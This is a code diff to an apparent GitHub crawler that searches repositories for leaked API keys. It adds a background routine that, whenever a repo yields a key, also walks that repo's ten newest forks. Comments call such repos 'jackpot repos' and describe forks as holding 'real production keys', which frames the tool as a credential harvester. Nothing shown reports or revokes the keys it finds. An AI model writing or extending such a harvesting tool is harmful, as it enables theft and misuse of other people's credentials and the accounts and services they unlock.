@@ -446,6 +446,12 @@ _TREEWALK_SKIP_DIRS = (
     "fixtures/", "cassettes/", ".git/",
 )
 
+# Forks of jackpot repos — when a tree_walk completes with N keys found,
+# also walk the top forks. Forks accumulate user-specific commits with
+# real production keys (vs the original template's placeholders).
+_FORK_WALK_MAX_FORKS = 10
+_FORK_WALK_MIN_KEYS_TO_TRIGGER = 1   # walk forks only if original yielded ≥ this
+
 
 def _is_interesting_blob(path: str, size: int) -> bool:
     if size > _TREEWALK_MAX_FILE_SIZE or size <= 0:
@@ -565,9 +571,54 @@ async def walk_repo_tree(client: httpx.AsyncClient, full_name: str,
         if keys_found:
             log.info("[treewalk] %s: %d files, %d new keys",
                      full_name, len(candidates), keys_found)
+            # Schedule fork-walks (background) — keys_found in original
+            # signals "this archetype leaks". Forks usually accumulate
+            # extra commits with prod-specific creds.
+            if keys_found >= _FORK_WALK_MIN_KEYS_TO_TRIGGER:
+                t = asyncio.create_task(
+                    _walk_forks(client, full_name, stars, created_at, token_headers),
+                    name=f"forks_{full_name}",
+                )
+                _BG_TASKS.add(t)
+                t.add_done_callback(_BG_TASKS.discard)
     except Exception as e:
         log.debug("treewalk err %s: %s", full_name, e)
         db.mark_repo_walked(full_name, 0, 0)
+
+
+async def _walk_forks(client: httpx.AsyncClient, full_name: str,
+                      stars: int, created_at: str,
+                      token_headers: dict) -> None:
+    """Fetch top forks and tree_walk each one. Triggered when the parent
+    repo yielded ≥1 key — forks of leaky templates often accumulate
+    additional production credentials."""
+    try:
+        url = f"{_BASE}/repos/{full_name}/forks"
+        forks = await _gh_get(
+            client, url, params={"per_page": _FORK_WALK_MAX_FORKS, "sort": "newest"},
+            headers=token_headers,
+        )
+        if not forks or not isinstance(forks, list):
+            return
+        for fork in forks[:_FORK_WALK_MAX_FORKS]:
+            fork_name = fork.get("full_name", "")
+            if not fork_name or fork_name == full_name:
+                continue
+            # Skip if already walked (try_claim_repo_tree atomically reserves)
+            # — walk_repo_tree itself does this check too, but checking here
+            # avoids spawning a no-op task.
+            try:
+                f_stars = fork.get("stargazers_count", 0)
+                f_created = fork.get("created_at", "")
+                # Recursive call — but fork's keys_found won't trigger another
+                # fork walk on a fork's forks (most forks have 0 forks anyway,
+                # and even if they do, the atomic claim prevents reentry).
+                await walk_repo_tree(client, fork_name, f_stars, f_created,
+                                     token_headers)
+            except Exception as e:
+                log.debug("fork walk err %s: %s", fork_name, e)
+    except Exception as e:
+        log.debug("walk_forks list err %s: %s", full_name, e)
 
 
 async def _process_inner(client: httpx.AsyncClient, item: dict,
